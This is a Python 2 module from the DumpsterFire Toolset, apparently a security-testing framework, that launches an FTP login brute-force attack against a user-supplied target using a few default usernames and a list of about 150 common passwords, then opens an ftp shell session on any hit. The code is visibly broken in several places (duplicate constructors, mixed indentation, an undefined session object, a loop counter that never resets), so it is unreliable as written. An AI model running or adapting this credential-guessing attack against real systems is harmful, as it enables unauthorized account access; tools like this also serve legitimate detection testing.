#!/usr/bin/python
#
# Filename:  ftp_linux_top_100_defaults.py.py
#
# Version: 1.0.0
#
# Author:  Joe Gervais (TryCatchHCF)
#
# Summary:
#
#	Part of the DumpsterFire Toolset. See documentation at https://github.com/TryCatchHCF/DumpsterFire
#
# Description:
#
#

import os, sys, datetime, ftplib


from FireModules.fire_module_base_class import *

class ftp_linux_top_100_defaults( FireModule ):

	def __init__(self):
		self.commentsStr = "AccountBruting/ftp_linux_top_100_defaults"

	def __init__(self, moofStr):
		self.moofStr = moofStr
		self.commentsStr = "AccountBruting/ftp_linux_top_100_defaults"
		return;

	def Description( self ):
		self.Description = "Launches ftp login bruteforce against target system, using common users/passwords"
		return self.Description

        def Configure( self ):
                self.targetSystem = raw_input( "Enter target address (W.X.Y.Z) or domain: " )
                return

        def GetParameters( self ):
                return( self.targetSystem )

        def SetParameters( self, parametersStr ):
                self.targetSystem = parametersStr
                return

        def ActivateLogging( self, logFlag ):
                print self.commentsStr + ": Setting Logging flag!"
                print logFlag
                return

        def Ignite( self ):

		if ( self.targetSystem == "" ):
			print "## ", self.commentsStr, ": Error - Network address string is blank"
			return
		else:

			self.mCurrentDateTimeUTC = datetime.datetime.utcnow()

			print "UTC", self.mCurrentDateTimeUTC.strftime("%x %X"), "- Attempting ftp connection to:", self.targetSystem
			try:
				print "Attempting to ftp into host", self.targetSystem

				i = 0
				m = 0
	
				while i < len( ftpUsernames ):
					while m < len( ftpPasswords ):

						if ftpSession.login( self.targetSystem, ftpUsernames[ i ], ftpPasswords[ m ] ):
							self.commandStr = "ftp " + ftpUsernames[ i ] + "@" + self.targetSystem
							os.system( self.commandStr )
						m = m + 1
					i = i + 1

			except:
				print "Could not establish ftp connection"

		return

    
	# Declare these lists down here so they don't clutter up the methods
	ftpUsernames = [ "admin", "root", "test", "ftp" ]
	ftpPasswords = [ "", \
			"admin", \
			"administrator", \
			"root", \
			"test", \
			"ftp", \
			"toor", \
			"dev", \
			"uploader", \
			"password", \
			"administrator", \
			"marketing", \
			"12345678", \
			"1234", \
			"12345", \
			"qwerty", \
			"webadmin", \
			"webmaster", \
			"maintenance", \
			"techsupport", \
			"letmein", \
			"logon", \
			"password", \
			"password1", \
			"Passw@rd", \
			"000000", \
			"111111", \
			"123123", \
			"1234", \
			"12345", \
			"123456", \
			"1234567", \
			"12345678", \
			"123456789", \
			"1234567890", \
			"654321", \
			"666666", \
			"987654321", \
			"abc123", \
			"amanda", \
			"andrea", \
			"andrew", \
			"angel", \
			"angels", \
			"anthony", \
			"ashley", \
			"babygirl", \
			"barbie", \
			"baseball", \
			"basketball", \
			"brandon", \
			"bubbles", \
			"butterfly", \
			"carlos", \
			"charlie", \
			"chelsea", \
			"chocolate", \
			"computer", \
			"cookie", \
			"daniel", \
			"danielle", \
			"dev", \
			"dragon", \
			"elizabeth", \
			"eminem", \
			"family", \
			"flower", \
			"footbal", \
			"football", \
			"forever", \
			"friends", \
			"fuckyou", \
			"hannah", \
			"hello", \
			"hottie", \
			"iloveu", \
			"iloveyou", \
			"jasmine", \
			"jennifer", \
			"jessica", \
			"jesus", \
			"jonathan", \
			"jordan", \
			"joseph", \
			"joshua", \
			"junior", \
			"justin", \
			"letmein", \
			"liverpool", \
			"logon", \
			"lovely", \
			"loveme", \
			"lovers", \
			"loveyou", \
			"maintaince", \
			"marketing", \
			"master", \
			"matthew", \
			"melissa", \
			"michael", \
			"michelle", \
			"monkey", \
			"mustang", \
			"naruto", \
			"nicole", \
			"ninja", \
			"playboy", \
			"pretty", \
			"princess", \
			"purple", \
			"querty", \
			"qwerty", \
			"raspberry", \
			"robert", \
			"samantha", \
			"secret", \
			"shadow", \
			"soccer", \
			"spongebob", \
			"summer", \
			"sunshine", \
			"superman", \
			"sweety", \
			"teamo", \
			"techsupport", \
			"tigger", \
			"tinkerbell", \
			"trustno1", \
			"tweety", \
			"uploader", \
			"vanessa", \
			"webadmin", \
			"webmaster", \
			"welcome", \
			"whatever" ]
